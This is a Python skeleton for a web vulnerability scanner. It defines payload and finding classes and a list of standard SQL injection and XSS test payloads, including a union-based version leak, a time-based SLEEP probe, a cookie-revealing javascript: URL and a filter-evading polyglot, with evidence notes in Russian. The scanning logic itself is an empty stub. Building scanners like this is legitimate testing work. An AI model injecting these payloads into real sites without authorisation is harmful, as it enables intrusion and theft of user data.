from enum import Enum
from typing import List


class Severity(Enum):
    INFO = "Info"
    LOW = "Low"
    MEDIUM = "Medium"
    HIGH = "High"
    CRITICAL = "Critical"


class VulnType(Enum):
    SQLI = "SQL Injection"
    XSS = "Cross-Site Scripting"
    SSRF = "Server-Side Request Forgery"
    RCE = "Remote Code Execution"


class MatchType(Enum):
    BOOLEAN = "boolean"
    UNION = "union"
    TIME_BASED = "time-based"
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "DOM-based"
    POLYGLOT = "polyglot"
    ERROR_BASED = "error-based"


class Payload:
    def __init__(
        self,
        payload_id: str,
        payload: str,
        vuln_type: VulnType,
        severity: Severity,
        match_type: MatchType,
        evidence_patterns: List[str],
    ):
        self.payload_id = payload_id
        self.payload = payload
        self.vuln_type = vuln_type
        self.severity = severity
        self.match_type = match_type
        self.evidence_patterns = evidence_patterns

    def to_dict(self):
        return {
            "payload_id": self.payload_id,
            "payload": self.payload,
            "vuln_type": self.vuln_type.name,
            "severity": self.severity.name,
            "match_type": self.match_type.name,
            "evidence_patterns": self.evidence_patterns,
        }


class Finding:

    def __init__(
        self, form_index: int, field_name: str, evidence: str, payload: Payload
    ):
        self.form_index = form_index
        self.field_name = field_name
        self.payload = payload
        self.evidence = evidence

    def to_dict(self):
        return {
            "form_index": self.form_index,
            "field_name": self.field_name,
            "payload": self.payload.to_dict(),
            "evidence": self.evidence,
        }


payloads = [
    Payload(
        payload_id="sql_bool_1",
        payload="' OR '1'='1",
        vuln_type=VulnType.SQLI,
        severity=Severity.HIGH,
        match_type="boolean",
        evidence_patterns=[
            "разные результаты при true/false",
            "логин без пароля",
            "отсутствие ошибок SQL",
        ],
    ),
    Payload(
        payload_id="sql_union_1",
        payload="' UNION SELECT 1,@@version--",
        vuln_type=VulnType.SQLI,
        severity=Severity.CRITICAL,
        match_type="union",
        evidence_patterns=[
            "версия БД в ответе",
            "дополнительные данные в выводе",
            "коды ошибок @@version",
        ],
    ),
    Payload(
        payload_id="sql_time_1",
        payload="' OR SLEEP(5)--",
        vuln_type=VulnType.SQLI,
        severity=Severity.MEDIUM,
        match_type="time-based",
        evidence_patterns=["задержка 5 секунд", "разное время ответа true/false"],
    ),
    Payload(
        payload_id="xss_reflected_1",
        payload="<script>alert(1)</script>",
        vuln_type=VulnType.XSS,
        severity=Severity.MEDIUM,
        match_type="reflected",
        evidence_patterns=[
            "скрипт выполняется",
            "теги не экранированы",
            "alert появляется",
        ],
    ),
    Payload(
        payload_id="xss_stored_1",
        payload='"><img src=x onerror=alert(1)>',
        vuln_type=VulnType.XSS,
        severity=Severity.HIGH,
        match_type="stored",
        evidence_patterns=[
            "тег img создается",
            "onerror срабатывает",
            "сохраняется между запросами",
        ],
    ),
    Payload(
        payload_id="xss_dom_1",
        payload="javascript:alert(document.cookie)",
        vuln_type=VulnType.XSS,
        severity=Severity.CRITICAL,
        match_type="DOM-based",
        evidence_patterns=[
            "выполняется в обработчике событий",
            "куки отображаются",
            "без отражения в ответе сервера",
        ],
    ),
    Payload(
        payload_id="xss_polyglot_1",
        payload="javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/'+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        vuln_type=VulnType.XSS,
        severity=Severity.HIGH,
        match_type="polyglot",
        evidence_patterns=[
            "работает в разных контекстах",
            "обходит простые фильтры",
            "выполнение скрипта",
        ],
    ),
    Payload(
        payload_id="sql_error_1",
        payload="' AND 1=CAST(@@VERSION AS INT)--",
        vuln_type=VulnType.SQLI,
        severity=Severity.MEDIUM,
        match_type="error-based",
        evidence_patterns=[
            "сообщение об ошибке SQL",
            "данные БД в стектрейсе",
            "версия СУБД в ответе",
        ],
    ),
]


def scan_forms(forms: List[dict]) -> List[Finding]:
    pass  # Implementation of scanning logic goes here
